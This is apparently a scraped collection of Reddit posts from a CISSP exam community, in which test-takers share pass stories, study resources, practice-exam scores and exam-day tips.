\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

\- I found Kelly Handerhan's Cybrary videos to be a bit too high level for me, but I think they would be a good entry point for someone new to the field.  Her videos are very down to earth and accessible.

\- I felt that the explanations in Pocket Prep and Boson adequately covered the Shon Harris and Chapple books, so I did not feel it necessary to buy them having drilled these apps.

I hope this is helpful! Good luck!",2021-08-24

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

In between the years after certified in CISSP, I have also certified in ISACA's 5 CXXX exams. 

Excited to submit my final endsorment for ISC2 to review. 

And should I say ""graduate"" from ISC2?

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken). But SSCP is a good interim step for you to prepare your CISSP if you don't have the full domain knowledge and experience.

324,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
325,p8he4a,Passed in 100 @ 100,"Took my exam today at 1PM and got a provisional pass!

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th. At that point I felt pretty confident in being able to tackle the exam, but from 8/10-8/19 I was eat/sleep/breath CISSP (wife wasn't a fan lol). The exam was definitely interesting. My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.  

I used the following material for prep: Books: 11th hour (read entire thing in last 48 hours), OSG 8th edition (probably spent less than an hour in this book over my course of studies), Luke Ahmeds 25 question book  Questions: Official Practice Tests 3rd edition (answered \~200 questions from here); Wiley Practice Tests (\~1000 questions); Pocket Prep (all 800, app is at 96% correct), Discord questions (a lot); ISC2 app (\~500 questions)  Videos: Kelly H. - Cybrary CISSP; Mike Chapple - LinkedinLearning; Destination Certification; CISSP Exam CRAM series; Prabh Nair, Luke Ahmed, etc.; every think like a manager video I could find :) The video content was probably 100% the reason I passed  Filled a 70 page notebook with things I was writing down from videos and books; probably wrote out BCP and SDLC process 10x each

328,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

1. Official Study Guide Sybex - Started with 8th edition but then purchased new one just to make sure I do not regret later. It was more or less same but it gave me confidence.
2. Official Sybex Practice Test (2nd edition covered 50% and 3rd edition 100%, latest edition is worth purchasing) – Please do not skip this. It covers ever single chapter, topic, and domain which will help you to know the content in a better way. Make sure you register your OSG and Practice test on Wiley for better experience and more questions.
3. Boson CISSP Test (Previous edition)
4. Mike Chapple CISSP Course on LinkedIn Learning
5. Kelly Handerhan on Cybrary

**Supplement Resources:**

1. Shon Harris CISSP Book (8th edition) - Read SDLC from this book, it’s too good.
2. Adam Gordon (ITPROTV, New 2021 version CISSP Fast-track Course)
3. Prabh Nair’s YouTube Videos - Very important, Do not skip these videos.
4. Destination Certification YouTube Videos - Watched these videos many at times during preparation. Watched few videos night before exam also and they were spot on.
5. Mike Chapple last minute exam review
6. 11th hour CISSP and Memory palace by Prashant Mohan
7. And bunch of random Google search, Wikipedia, and YouTube videos.

Initially I started marking on book but soon I realized, it was going into my volatile memory. I needed it in my secondary memory so I started writing notes for each domain and they helped me a lot. This was the best decision of mine.

Group study on google meet for 2 weeks with 2 other aspirants. We studied for almost 3 hours daily and 8 hours on weekend just 3 weeks before the exam. Best part is, all 3 of us PASSED. I am sure they are reading my post right now ;)

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions. Watch these 3 videos for the right mindset before you go for the exam–

Please focus on each topic and try to understand in detail. Write notes, read your notes daily, ask question to yourself and give answer to yourself. If you are satisfied with your answer, you are good to go. Pay special attention to words which have synonyms mentioned in the book.

352,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
353,p4k8rc,Feeling unprepared for my upcoming test. Should I cancel?,"Update: Decided to go ahead and take the exam today despite feeling certain that I would fail.

This seems like an exam where the preparation is the most daunting part given the volume of info that you might encounter on the exam. Thanks for all the comments and advice prior to the exam!

Posted this elsewhere but looking for a few more opinions.

Thinking about cancelling my upcoming test (four days away). Was scoring in the 80's on the Sybex official practice exams and figured I was ready. Then I watched Larry Greenblatt's CISSP questions on youtube and got almost all of them wrong (always narrowed it down to the correct two and then chose the wrong one). Then I took Thor's Hard CISSP Questions exam on Udemy today and scored 60.  Perhaps I'm rushing the process. Been studying for about 10 weeks.

This would be my first attempt and is paid for. Any further attempts would be out of pocket, though the expense doesn't bother me too much. Any feedback would be much appreciated.",2021-08-15
354,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.  If not, congrats to those who have been certified and good luck to those that are working towards!",2021-08-14
355,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.

357,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13
358,p3fq82,"Obligatory ""I passed"" post","I was confident going in that I hadn't studied nearly enough, but by question 25 I was already positive that I was going to pass. Ended up passing at 100 questions in 93 minutes. 
Background wise I only have a year of direct cyber security experience as a security analyst, and a year of sys admin experience before that, plus some security and management experience from way back in the day. I also have the Cybersecurity Bachelor's from WGU, and a bunch of other lower level certs (CCSP, SSCP, AWS SAA, Cysa+, A+, Sec+, Net+, PenTest+, Project+, ITIL, couple of garbage EC-Council certs).

As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter. I also read part of the 11th Hour study guide and went through some of the CISSP Practice Exam book by Shon Harris, like maybe a third of it. I was getting around 80% on practice exams before sitting the exam.
I also watched that ""Why you will pass the CISSP"" video everyone recommends before leaving for the exam today, and it definitely helped getting in the right mindset for the test.

All in all, I don't think it's actually as difficult as some people make it out to be, if you have at least some related experience and actually do some studying.",2021-08-13

360,p35d9k,Officially Passed today!!!,"Sharing the good news here because without this group I don't think I would have made it. 

The exam is what everyone says, it's hard and grueling but i approached it with a mangers mindset and got the job done!

For anyone who is struggling please know that I failed this exam before but this group inspired me to keep going, so thanks you all. 

For studying, i used a wide variety of material including a one week intense bootcamp which was very expensive - all paid for by work. If honest, I think the best was Thor Peterson online material with questions and Boson.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads. 

Now good luck to anyone on their journey. 

Very best,

361,p38ldf,"Looking for a career enhancement/change, which certification?","Hi all,

I've turned 30 this year and would like to enhance my career in the Infosec field. First 2 years of my career is like a Junior IT Project Manager. But the latter two years I've been working with Building Estates, while its fun to diversify but I don't really see myself doing it for long.

Now that I'm looking to move up in my career, while staying within the UK government sector, I'd like to have some specialised knowledge so I am not just another generic Project Manager. This is where I came across CISSP. Sadly reading through the certifications they all require some working experience.

Got an email this morning saying my membership has been suspended for non payment and although a little sad at least I am not working for anyone else and my gym has the best surveillance system in the world :)Good luck to you all I have met many great people through the industry and it is well worth doing the CISSP if you want people to take you seriously.

Edit: Thank you all for the kind comments. I was finally able to make the one thing that kept me sane into a full time career. As an aside if I did have one piece of advice it would be to have something in your life that is completely different from IT in order to give you a different perspective on an ongoing basis.

364,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12

366,p2apwi,Passed CISSP exam in first attempt,"Hi All,

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

**Exam day -** 

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11

369,p209gl,Passed using only free military resources,"So first up, I passed today at 100 questions in 80 minutes.  And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too. Disclaimer: I do have a bit of background in IT project management and cybersecurity, but still I think these resources are more than enough    
  
* Udemy.  [DigitalU.]( https://digitalu.udemy.com) So the Air Force is paying for an business license and you can use your .mil email to register and say you are in the AF. [Thor Pedersen]( https://www.udemy.com/user/thorpedersen/) covers a lot of the CISSP material.
* [O’Reilly Media.]( https://www.oreilly.com/online-learning/government.html) I had to email their customer service to get them to activate a free license for me, and that took about 7 days. Gives access to lots of free ebooks and some test, to include Sybex’s official book and practice tests.
* [Wiley.]( https://www.efficientlearning.com/) Used the free ebook from O’Reilly and registed to use Wiley’s practice engine. This is where I spent most of my time.
